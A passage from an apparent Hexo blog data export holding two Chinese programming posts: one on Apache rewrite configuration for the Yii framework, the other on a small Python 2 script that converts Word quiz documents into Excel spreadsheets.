首先是yii的rewrite，由于yii会重写url，所以需要对apache或yii配置\napache的配置:\n\n```\n# 设置文档根目录为 \"basic/web\"\nDocumentRoot \"path/to/basic/web\"\n\n<Directory \"path/to/basic/web\">\n    # 开启 mod_rewrite 用于美化 URL 功能的支持（译注：对应 pretty URL 选项）\n    RewriteEngine on\n    # 如果请求的是真实存在的文件或目录，直接访问\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    # 如果请求的不是真实文件或目录，分发请求至 index.php\n    RewriteRule . index.php\n\n    # ...其它设置...\n</Directory>\n```\n\n2. 各种php拓展\n\n其实这个在文档中也说明了。。`php requestments.php`即可，把fail的安装上去就好了。。","source":"_posts/yii踩坑记录.md","raw":"---\ntitle: yii踩坑记录\ntags:\n  - yii\n  - web\ncategories: []\ndate: 2017-06-01 09:34:01\n---\n\n\n为了这个网站可是踩了我太多太多坑了TAT。。\n最最重要的一点经验就是，_**好好读文档比什么都重要**_\n\n<!--more-->\n\n1. 首先是yii的rewrite，由于yii会重写url，所以需要对apache或yii配置\napache的配置:\n\n```\n# 设置文档根目录为 \"basic/web\"\nDocumentRoot \"path/to/basic/web\"\n\n<Directory \"path/to/basic/web\">\n    # 开启 mod_rewrite 用于美化 URL 功能的支持（译注：对应 pretty URL 选项）\n    RewriteEngine on\n    # 如果请求的是真实存在的文件或目录，直接访问\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    # 如果请求的不是真实文件或目录，分发请求至 index.php\n    RewriteRule . index.php\n\n    # ...其它设置...\n</Directory>\n```\n\n2. 各种php拓展\n\n其实这个在文档中也说明了。。`php requestments.php`即可，把fail的安装上去就好了。。","slug":"yii踩坑记录","published":1,"updated":"2017-06-01T01:39:54.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k3i004lhv180rn7hkuz","content":"<p>为了这个网站可是踩了我太多太多坑了TAT。。<br>最最重要的一点经验就是，<em><strong>好好读文档比什么都重要</strong></em></p>\n<a id=\"more\"></a>\n<ol>\n<li>首先是yii的rewrite，由于yii会重写url，所以需要对apache或yii配置<br>apache的配置:</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 设置文档根目录为 \"basic/web\"</span></div><div class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">DocumentRoot</span></span> <span class=\"string\">\"path/to/basic/web\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"section\">&lt;Directory \"path/to/basic/web\"&gt;</span></div><div class=\"line\">    <span class=\"comment\"># 开启 mod_rewrite 用于美化 URL 功能的支持（译注：对应 pretty URL 选项）</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteEngine</span></span> <span class=\"literal\">on</span></div><div class=\"line\">    <span class=\"comment\"># 如果请求的是真实存在的文件或目录，直接访问</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteCond</span></span> <span class=\"variable\">%&#123;REQUEST_FILENAME&#125;</span> !-f</div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteCond</span></span> <span class=\"variable\">%&#123;REQUEST_FILENAME&#125;</span> !-d</div><div class=\"line\">    <span class=\"comment\"># 如果请求的不是真实文件或目录，分发请求至 index.php</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteRule</span></span> . index.php</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># ...其它设置...</span></div><div class=\"line\"><span class=\"section\">&lt;/Directory&gt;</span></div></pre></td></tr></table></figure>\n<ol>\n<li>各种php拓展</li>\n</ol>\n<p>其实这个在文档中也说明了。。<code>php requestments.php</code>即可，把fail的安装上去就好了。。</p>\n","excerpt":"<p>为了这个网站可是踩了我太多太多坑了TAT。。<br>最最重要的一点经验就是，<em><strong>好好读文档比什么都重要</strong></em></p>","more":"<ol>\n<li>首先是yii的rewrite，由于yii会重写url，所以需要对apache或yii配置<br>apache的配置:</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 设置文档根目录为 \"basic/web\"</span></div><div class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">DocumentRoot</span></span> <span class=\"string\">\"path/to/basic/web\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"section\">&lt;Directory \"path/to/basic/web\"&gt;</span></div><div class=\"line\">    <span class=\"comment\"># 开启 mod_rewrite 用于美化 URL 功能的支持（译注：对应 pretty URL 选项）</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteEngine</span></span> <span class=\"literal\">on</span></div><div class=\"line\">    <span class=\"comment\"># 如果请求的是真实存在的文件或目录，直接访问</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteCond</span></span> <span class=\"variable\">%&#123;REQUEST_FILENAME&#125;</span> !-f</div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteCond</span></span> <span class=\"variable\">%&#123;REQUEST_FILENAME&#125;</span> !-d</div><div class=\"line\">    <span class=\"comment\"># 如果请求的不是真实文件或目录，分发请求至 index.php</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">RewriteRule</span></span> . index.php</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># ...其它设置...</span></div><div class=\"line\"><span class=\"section\">&lt;/Directory&gt;</span></div></pre></td></tr></table></figure>\n<ol>\n<li>各种php拓展</li>\n</ol>\n<p>其实这个在文档中也说明了。。<code>php requestments.php</code>即可，把fail的安装上去就好了。。</p>"},{"title":"一个小python程序doc2xlsx","date":"2017-07-06T08:36:43.000Z","_content":"\n这破玩意因为编码问题坑了我看好久，还有就是dict的深浅拷贝的问题。\n\n<!--more-->\n\n```\nimport sys, os\nimport docx\nimport openpyxl\nimport chardet           # 检测编码格式用的，蛮好用\nimport re                     # 我的没用到很多\nfrom win32com import client as wc                # 处理doc转docx\n```\n\npython处理doc的包\n`pip install python-docx`\npthon处理excel的包\n`pip install openpyxl`\n\n在使用python-docx的包必须要将doc转换成docx，用`win32com`即可，这个包属于`pypiwin32`\n安装方式`pip install pypiwin32`\n\n使用的时候不知道为什么\n```\nimport win32com\nword = win32com.client.Dispatch('Word.Application')\n```\n会报错`client`找不到\n\n只能够使用`from win32com import client as wc`的方式处理\n\n下面的代码将doc转换成docx\n```\ndef doc2docx(path, docname):\n    word = wc.Dispatch('Word.Application')\n    doc = word.Documents.Open(ur'{}'.format(os.path.join(path, docname)))\n    newfilename = os.path.join(path, docname.split('.')[0] + '.docx')\n    doc.SaveAs(ur'{}'.format(newfilename), 16)                  #16表示保存额为docx\n    doc.Close()\n    word.Quit()\n    return newfilename\n```\n\n关于字典的深浅拷贝，直接应用别人的一段代码来说明\n```\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \ndict1 =  {'user':'runoob','num':[1,2,3]}\n \ndict2 = dict1          # 浅拷贝: 引用对象\ndict3 = dict1.copy()   # 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用\n \n# 修改 data 数据\ndict1['user']='root'\ndict1['num'].remove(1)\n \n# 输出结果\nprint(dict1)\nprint(dict2)\nprint(dict3)\n```\n\n全部代码，虽然只有90行，但是查了我不少资料，果然我python基本功还是不行。。\n```\n#coding=utf-8\n\nimport sys, os\nimport docx\nimport openpyxl\nimport chardet\nimport re\nfrom win32com import client as wc\n\ndef doc2docx(path, docname):\n    word = wc.Dispatch('Word.Application')\n    doc = word.Documents.Open(ur'{}'.format(os.path.join(path, docname)))\n    newfilename = os.path.join(path, docname.split('.')[0] + '.docx')\n    doc.SaveAs(ur'{}'.format(newfilename), 16)\n    doc.Close()\n    word.Quit()\n    return newfilename\n\ndef wordparse(path, docname):\n    document = docx.Document(ur'{}'.format(os.path.join(path, docname)))\n    lines = [paragraph.text.encode('utf-8') for paragraph in document.paragraphs ]\n    # 图书编号\t书名\t试题编号\t测试题题干\t选项1\t选项2\t选项3\t选项4\t选项5\t答案\t选项数量\n    col = {'bookno': None, 'bookname': None, 'problemno': None, 'problemcontent': None, 'chose1': None,\n           'chose2': None, 'chose3': None, 'chose4': None, 'answer': None, 'answercount': 4}\n    result = []\n    groupproblem = []\n    tmpresult = []\n    for line in lines:\n        if re.match(r'^\\d', line):\n            if groupproblem != []:\n                tmpresult.append(groupproblem)\n                groupproblem = []\n                groupproblem.append(line)\n            else:\n                groupproblem.append(line)\n        else:\n            if line != '':\n                groupproblem.append(line)\n    for tmpproblem in tmpresult:\n        tmpstr = ''\n        tmpcol = col.copy()\n        for line in tmpproblem:\n            tmpstr += line\n        try:\n            content = tmpstr.find('、')\n            k1 = tmpstr.find('（')\n            k2 = tmpstr.find('）')\n            A = tmpstr.find('A', k2)\n            B = tmpstr.find('B', k2)\n            C = tmpstr.find('C', k2)\n            D = tmpstr.find('D', k2)\n            tmpcol['bookno'] = 'B1-xiaoxue'\n            tmpcol['bookname'] = '《传播网络正能量（小学版）》'\n            tmpcol['problemno'] = tmpstr[:content]\n            tmpcol['problemcontent'] = tmpstr[content+3:k1] + '____' + tmpstr[k2+3:A]\n            tmpcol['chose1'], tmpcol['chose2'], tmpcol['chose3'], tmpcol['chose4'] = tmpstr[A:B], tmpstr[B:C], tmpstr[C:D], tmpstr[D:]\n            tmpcol['answer'] = tmpstr[k1+3:k2]\n            result.append(tmpcol)\n        except:\n            print tmpstr\n            exit()\n    return result\n\ndef write2xlsx(filename, data):\n    workbook = openpyxl.Workbook()\n    worksheet = workbook.create_sheet('problem', 0)\n    colname = ['bookno', 'bookname', 'problemno', 'problemcontent', 'chose1',\n           'chose2', 'chose3', 'chose4', 'answer', 'answercount']\n    i, j = 1, 1\n    for col in data:\n        j = 1\n        col['problemno'] = i\n        for name in colname:\n            try:\n                worksheet.cell(row=i, column=j, value=col[name])\n            except:\n                print col['problemno'], name, col[name]\n                exit()\n            j += 1\n        i += 1\n    workbook.save('{}'.format(filename))\n    return\n\n\nif __name__ == '__main__':\n    path, filename = os.path.split(sys.argv[1])[0], os.path.split(sys.argv[1])[1]\n    suffix = filename.split('.')[1]\n    if suffix == 'doc':\n        newfilename = doc2docx(path, filename)\n    else:\n        newfilename = filename\n\n    data = wordparse(path=path, docname=newfilename)\n    write2xlsx(sys.argv[2], data)\n```","source":"_posts/一个小python程序doc2xlsx.md","raw":"---\ntitle: 一个小python程序doc2xlsx\ntags:\n  - python\ncategories: []\ndate: 2017-07-06 16:36:43\n---\n\n这破玩意因为编码问题坑了我看好久，还有就是dict的深浅拷贝的问题。\n\n<!--more-->\n\n```\nimport sys, os\nimport docx\nimport openpyxl\nimport chardet           # 检测编码格式用的，蛮好用\nimport re                     # 我的没用到很多\nfrom win32com import client as wc                # 处理doc转docx\n```\n\npython处理doc的包\n`pip install python-docx`\npthon处理excel的包\n`pip install openpyxl`\n\n在使用python-docx的包必须要将doc转换成docx，用`win32com`即可，这个包属于`pypiwin32`\n安装方式`pip install pypiwin32`\n\n使用的时候不知道为什么\n```\nimport win32com\nword = win32com.client.Dispatch('Word.Application')\n```\n会报错`client`找不到\n\n只能够使用`from win32com import client as wc`的方式处理\n\n下面的代码将doc转换成docx\n```\ndef doc2docx(path, docname):\n    word = wc.Dispatch('Word.Application')\n    doc = word.Documents.Open(ur'{}'.format(os.path.join(path, docname)))\n    newfilename = os.path.join(path, docname.split('.')[0] + '.docx')\n    doc.SaveAs(ur'{}'.format(newfilename), 16)                  #16表示保存额为docx\n    doc.Close()\n    word.Quit()\n    return newfilename\n```\n\n关于字典的深浅拷贝，直接应用别人的一段代码来说明\n```\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \ndict1 =  {'user':'runoob','num':[1,2,3]}\n \ndict2 = dict1          # 浅拷贝: 引用对象\ndict3 = dict1.copy()   # 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用\n \n# 修改 data 数据\ndict1['user']='root'\ndict1['num'].remove(1)\n \n# 输出结果\nprint(dict1)\nprint(dict2)\nprint(dict3)\n```\n\n全部代码，虽然只有90行，但是查了我不少资料，果然我python基本功还是不行。。\n```\n#coding=utf-8\n\nimport sys, os\nimport docx\nimport openpyxl\nimport chardet\nimport re\nfrom win32com import client as wc\n\ndef doc2docx(path, docname):\n    word = wc.Dispatch('Word.Application')\n    doc = word.Documents.Open(ur'{}'.format(os.path.join(path, docname)))\n    newfilename = os.path.join(path, docname.split('.')[0] + '.docx')\n    doc.SaveAs(ur'{}'.format(newfilename), 16)\n    doc.Close()\n    word.Quit()\n    return newfilename\n\ndef wordparse(path, docname):\n    document = docx.Document(ur'{}'.format(os.path.join(path, docname)))\n    lines = [paragraph.text.encode('utf-8') for paragraph in document.paragraphs ]\n    # 图书编号\t书名\t试题编号\t测试题题干\t选项1\t选项2\t选项3\t选项4\t选项5\t答案\t选项数量\n    col = {'bookno': None, 'bookname': None, 'problemno': None, 'problemcontent': None, 'chose1': None,\n           'chose2': None, 'chose3': None, 'chose4': None, 'answer': None, 'answercount': 4}\n    result = []\n    groupproblem = []\n    tmpresult = []\n    for line in lines:\n        if re.match(r'^\\d', line):\n            if groupproblem != []:\n                tmpresult.append(groupproblem)\n                groupproblem = []\n                groupproblem.append(line)\n            else:\n                groupproblem.append(line)\n        else:\n            if line != '':\n                groupproblem.append(line)\n    for tmpproblem in tmpresult:\n        tmpstr = ''\n        tmpcol = col.copy()\n        for line in tmpproblem:\n            tmpstr += line\n        try:\n            content = tmpstr.find('、')\n            k1 = tmpstr.find('（')\n            k2 = tmpstr.find('）')\n            A = tmpstr.find('A', k2)\n            B = tmpstr.find('B', k2)\n            C = tmpstr.find('C', k2)\n            D = tmpstr.find('D', k2)\n            tmpcol['bookno'] = 'B1-xiaoxue'\n            tmpcol['bookname'] = '《传播网络正能量（小学版）》'\n            tmpcol['problemno'] = tmpstr[:content]\n            tmpcol['problemcontent'] = tmpstr[content+3:k1] + '____' + tmpstr[k2+3:A]\n            tmpcol['chose1'], tmpcol['chose2'], tmpcol['chose3'], tmpcol['chose4'] = tmpstr[A:B], tmpstr[B:C], tmpstr[C:D], tmpstr[D:]\n            tmpcol['answer'] = tmpstr[k1+3:k2]\n            result.append(tmpcol)\n        except:\n            print tmpstr\n            exit()\n    return result\n\ndef write2xlsx(filename, data):\n    workbook = openpyxl.Workbook()\n    worksheet = workbook.create_sheet('problem', 0)\n    colname = ['bookno', 'bookname', 'problemno', 'problemcontent', 'chose1',\n           'chose2', 'chose3', 'chose4', 'answer', 'answercount']\n    i, j = 1, 1\n    for col in data:\n        j = 1\n        col['problemno'] = i\n        for name in colname:\n            try:\n                worksheet.cell(row=i, column=j, value=col[name])\n            except:\n                print col['problemno'], name, col[name]\n                exit()\n            j += 1\n        i += 1\n    workbook.save('{}'.format(filename))\n    return\n\n\nif __name__ == '__main__':\n    path, filename = os.path.split(sys.argv[1])[0], os.path.split(sys.argv[1])[1]\n    suffix = filename.split('.')[1]\n    if suffix == 'doc':\n        newfilename = doc2docx(path, filename)\n    else:\n        newfilename = filename\n\n    data = wordparse(path=path, docname=newfilename)\n    write2xlsx(sys.argv[2], data)\n```","slug":"一个小python程序doc2xlsx","published":1,"updated":"2017-07-06T11:13:17.202Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k3l004nhv182hkfrtb3","content":"<p>这破玩意因为编码问题坑了我看好久，还有就是dict的深浅拷贝的问题。</p>\n<a id=\"more\"></a>\n<figure class=\"highlight elm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys, os</div><div class=\"line\"><span class=\"keyword\">import</span> docx</div><div class=\"line\"><span class=\"keyword\">import</span> openpyxl</div><div class=\"line\"><span class=\"keyword\">import</span> chardet           # 检测编码格式用的，蛮好用</div><div class=\"line\"><span class=\"keyword\">import</span> re                     # 我的没用到很多</div><div class=\"line\"><span class=\"title\">from</span> win32com <span class=\"keyword\">import</span> client <span class=\"keyword\">as</span> wc                # 处理doc转docx</div></pre></td></tr></table></figure>\n<p>python处理doc的包<br><code>pip install python-docx</code><br>pthon处理excel的包<br><code>pip install openpyxl</code></p>\n<p>在使用python-docx的包必须要将doc转换成docx，用<code>win32com</code>即可，这个包属于<code>pypiwin32</code><br>安装方式<code>pip install pypiwin32</code></p>\n<p>使用的时候不知道为什么<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">import win32com</div><div class=\"line\">word = win32com<span class=\"selector-class\">.client</span><span class=\"selector-class\">.Dispatch</span>(<span class=\"string\">'Word.Application'</span>)</div></pre></td></tr></table></figure></p>\n<p>会报错<code>client</code>找不到</p>\n<p>只能够使用<code>from win32com import client as wc</code>的方式处理</p>\n<p>下面的代码将doc转换成docx<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">doc2docx</span><span class=\"params\">(path, docname)</span>:</span></div><div class=\"line\">    word = wc.Dispatch(<span class=\"string\">'Word.Application'</span>)</div><div class=\"line\">    doc = word.Documents.Open(<span class=\"string\">ur'&#123;&#125;'</span>.format(os.path.join(path, docname)))</div><div class=\"line\">    newfilename = os.path.join(path, docname.split(<span class=\"string\">'.'</span>)[<span class=\"number\">0</span>] + <span class=\"string\">'.docx'</span>)</div><div class=\"line\">    doc.SaveAs(<span class=\"string\">ur'&#123;&#125;'</span>.format(newfilename), <span class=\"number\">16</span>)                  <span class=\"comment\">#16表示保存额为docx</span></div><div class=\"line\">    doc.Close()</div><div class=\"line\">    word.Quit()</div><div class=\"line\">    <span class=\"keyword\">return</span> newfilename</div></pre></td></tr></table></figure></p>\n<p>关于字典的深浅拷贝，直接应用别人的一段代码来说明<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></div><div class=\"line\"> </div><div class=\"line\">dict1 =  &#123;<span class=\"string\">'user'</span>:<span class=\"string\">'runoob'</span>,<span class=\"string\">'num'</span>:[1,2,3]&#125;</div><div class=\"line\"> </div><div class=\"line\">dict2 = dict1          <span class=\"comment\"># 浅拷贝: 引用对象</span></div><div class=\"line\">dict3 = dict1.copy()   <span class=\"comment\"># 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"comment\"># 修改 data 数据</span></div><div class=\"line\">dict1[<span class=\"string\">'user'</span>]=<span class=\"string\">'root'</span></div><div class=\"line\">dict1[<span class=\"string\">'num'</span>].remove(1)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"comment\"># 输出结果</span></div><div class=\"line\"><span class=\"built_in\">print</span>(dict1)</div><div class=\"line\"><span class=\"built_in\">print</span>(dict2)</div><div class=\"line\"><span class=\"built_in\">print</span>(dict3)</div></pre></td></tr></table></figure></p>\n<p>全部代码，虽然只有90行，但是查了我不少资料，果然我python基本功还是不行。。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> sys, os</div><div class=\"line\"><span class=\"keyword\">import</span> docx</div><div class=\"line\"><span class=\"keyword\">import</span> openpyxl</div><div class=\"line\"><span class=\"keyword\">import</span> chardet</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">from</span> win32com <span class=\"keyword\">import</span> client <span class=\"keyword\">as</span> wc</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">doc2docx</span><span class=\"params\">(path, docname)</span>:</span></div><div class=\"line\">    word = wc.Dispatch(<span class=\"string\">'Word.Application'</span>)</div><div class=\"line\">    doc = word.Documents.Open(<span class=\"string\">ur'&#123;&#125;'</span>.format(os.path.join(path, docname)))</div><div class=\"line\">    newfilename = os.path.join(path, docname.split(<span class=\"string\">'.'</span>)[<span class=\"number\">0</span>] + <span class=\"string\">'.docx'</span>)</div><div class=\"line\">    doc.SaveAs(<span class=\"string\">ur'&#123;&#125;'</span>.format(newfilename), <span class=\"number\">16</span>)</div><div class=\"line\">    doc.Close()</div><div class=\"line\">    word.Quit()</div><div class=\"line\">    <span class=\"keyword\">return</span> newfilename</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wordparse</span><span class=\"params\">(path, docname)</span>:</span></div><div class=\"line\">    document = docx.Document(<span class=\"string\">ur'&#123;&#125;'</span>.format(os.path.join(path, docname)))</div><div class=\"line\">    lines = [paragraph.text.encode(<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">for</span> paragraph <span class=\"keyword\">in</span> document.paragraphs ]</div><div class=\"line\">    <span class=\"comment\"># 图书编号\t书名\t试题编号\t测试题题干\t选项1\t选项2\t选项3\t选项4\t选项5\t答案\t选项数量</span></div><div class=\"line\">    col = &#123;<span class=\"string\">'bookno'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'bookname'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'problemno'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'problemcontent'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'chose1'</span>: <span class=\"keyword\">None</span>,</div><div class=\"line\">           <span class=\"string\">'chose2'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'chose3'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'chose4'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'answer'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'answercount'</span>: <span class=\"number\">4</span>&#125;</div><div class=\"line\">    result = []</div><div class=\"line\">    groupproblem = []</div><div class=\"line\">    tmpresult = []</div><div class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines:</div><div class=\"line\">        <span class=\"keyword\">if</span> re.match(<span class=\"string\">r'^\\d'</span>, line):</div><div class=\"line\">            <span class=\"keyword\">if</span> groupproblem != []:</div><div class=\"line\">                tmpresult.append(groupproblem)</div><div class=\"line\">                groupproblem = []</div><div class=\"line\">                groupproblem.append(line)</div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                groupproblem.append(line)</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"keyword\">if</span> line != <span class=\"string\">''</span>:</div><div class=\"line\">                groupproblem.append(line)</div><div class=\"line\">    <span class=\"keyword\">for</span> tmpproblem <span class=\"keyword\">in</span> tmpresult:</div><div class=\"line\">        tmpstr = <span class=\"string\">''</span></div><div class=\"line\">        tmpcol = col.copy()</div><div class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> tmpproblem:</div><div class=\"line\">            tmpstr += line</div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            content = tmpstr.find(<span class=\"string\">'、'</span>)</div><div class=\"line\">            k1 = tmpstr.find(<span class=\"string\">'（'</span>)</div><div class=\"line\">            k2 = tmpstr.find(<span class=\"string\">'）'</span>)</div><div class=\"line\">            A = tmpstr.find(<span class=\"string\">'A'</span>, k2)</div><div class=\"line\">            B = tmpstr.find(<span class=\"string\">'B'</span>, k2)</div><div class=\"line\">            C = tmpstr.find(<span class=\"string\">'C'</span>, k2)</div><div class=\"line\">            D = tmpstr.find(<span class=\"string\">'D'</span>, k2)</div><div class=\"line\">            tmpcol[<span class=\"string\">'bookno'</span>] = <span class=\"string\">'B1-xiaoxue'</span></div><div class=\"line\">            tmpcol[<span class=\"string\">'bookname'</span>] = <span class=\"string\">'《传播网络正能量（小学版）》'</span></div><div class=\"line\">            tmpcol[<span class=\"string\">'problemno'</span>] = tmpstr[:content]</div><div class=\"line\">            tmpcol[<span class=\"string\">'problemcontent'</span>] = tmpstr[content+<span class=\"number\">3</span>:k1] + <span class=\"string\">'____'</span> + tmpstr[k2+<span class=\"number\">3</span>:A]</div><div class=\"line\">            tmpcol[<span class=\"string\">'chose1'</span>], tmpcol[<span class=\"string\">'chose2'</span>], tmpcol[<span class=\"string\">'chose3'</span>], tmpcol[<span class=\"string\">'chose4'</span>] = tmpstr[A:B], tmpstr[B:C], tmpstr[C:D], tmpstr[D:]</div><div class=\"line\">            tmpcol[<span class=\"string\">'answer'</span>] = tmpstr[k1+<span class=\"number\">3</span>:k2]</div><div class=\"line\">            result.append(tmpcol)</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            <span class=\"keyword\">print</span> tmpstr</div><div class=\"line\">            exit()</div><div class=\"line\">    <span class=\"keyword\">return</span> result</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write2xlsx</span><span class=\"params\">(filename, data)</span>:</span></div><div class=\"line\">    workbook = openpyxl.Workbook()</div><div class=\"line\">    worksheet = workbook.create_sheet(<span class=\"string\">'problem'</span>, <span class=\"number\">0</span>)</div><div class=\"line\">    colname = [<span class=\"string\">'bookno'</span>, <span class=\"string\">'bookname'</span>, <span class=\"string\">'problemno'</span>, <span class=\"string\">'problemcontent'</span>, <span class=\"string\">'chose1'</span>,</div><div class=\"line\">           <span class=\"string\">'chose2'</span>, <span class=\"string\">'chose3'</span>, <span class=\"string\">'chose4'</span>, <span class=\"string\">'answer'</span>, <span class=\"string\">'answercount'</span>]</div><div class=\"line\">    i, j = <span class=\"number\">1</span>, <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> data:</div><div class=\"line\">        j = <span class=\"number\">1</span></div><div class=\"line\">        col[<span 